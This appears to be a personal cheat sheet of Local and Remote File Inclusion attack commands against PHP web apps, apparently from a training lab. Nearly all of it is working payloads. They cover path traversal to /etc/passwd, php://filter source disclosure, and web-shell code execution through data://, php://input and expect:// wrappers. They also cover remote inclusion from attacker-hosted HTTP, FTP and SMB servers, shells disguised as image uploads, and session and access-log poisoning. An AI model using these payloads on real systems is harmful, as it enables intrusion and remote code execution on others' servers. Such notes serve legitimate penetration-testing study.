# Local File Inclusion

### Path Traversal

```shell
    /etc/passswd
  ../../../etc/passwd

  ..//..//..//etc/passwd
  ....//....//....//etc/passwd
  ../ = %2e%2e%2f

  non_existing_directory/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd/./././././
  non_existing_directory/../../../etc/passwd/./././././

  ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
  php://filter/read=convert.base64-encode/resource=config
  echo -n "<base_64_encoding> | base64 -d
```

---

### RCE

```shell
  curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
  echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include # if we have it on exploit
  echo '<?php system($_GET["cmd"]); ?>' | base64
  curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
  curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=ls+l'

  #Input
  curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid

  echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect # extension = expect
  curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```

---

### RFI

```shell
  curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
  curl "http://<SERVER_IP>:<PORT>/index.php?page=php://filter/read=convert.base64-encode/resource=index"
  echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
  echo '<?php system($_GET["cmd"]); ?>' > shell.php
  sudo python3 -m http.server <LISTENING_PORT>

  curl -w "\n" -s 'http://STMIP/index.php?language=http://PWNIP:8000/webShell.php&cmd=ls+/' | grep -v "<.*>"

  sudo python -m pyftpdlib -p 21
  curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'

  impacket-smbserver -smb2support share $(pwd)
  \\<OUR_IP>\share\shell.php
```

---

### LFI

```shell
  echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
  <img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
  echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.ph
  php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg

  curl -s -w "\n" 'http://STMIP:STMPO/index.php?language=./profile_images/shell.gif&cmd=ls+/' | grep -v "<.*>"

  # Log poisoning
  http://STMIP:STMPO/index.php?language=/var/lib/php/sessions/sess_iic5bp46saajhe9jtshind2vsh # after sess the phpsessid cookie value
  http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
  http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E

  http://STMIP:STMPO/index.php?language=/var/lib/php/sessions/sess_iic5bp46saajhe9jtshind2vsh&cmd=pwd # after the poisoning sess the phpsessid cookie value


  # Second method
  http://STMIP:STMPO/index.php?language=/var/log/apache2/access.log
  echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
  curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
  GET /index.php?language=/var/log/apache2/access.log&cmd=ls+/ HTTP/1.1
  GET /index.php?language=/var/log/apache2/access.log&cmd=cat+/c85ee5082f4c723ace6c0796e3a3db09.txt
```

---

### Automation

```shell
  ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
  ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
  ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
  ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
  curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf
  
```
